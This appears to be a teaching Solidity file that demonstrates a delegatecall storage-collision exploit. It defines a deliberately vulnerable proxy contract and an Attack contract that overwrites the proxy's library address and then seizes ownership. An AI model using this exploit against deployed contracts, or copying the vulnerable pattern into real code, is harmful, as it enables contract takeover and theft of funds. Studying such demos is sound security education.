// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract Mycontract {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint public someNumber;

    Mycontract public mycontract;

    constructor(Mycontract _address) {
        mycontract = Mycontract(_address);
    }

    function attack() public {
        mycontract.doSomething(uint(uint160(address(this))));        
        mycontract.doSomething(1);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}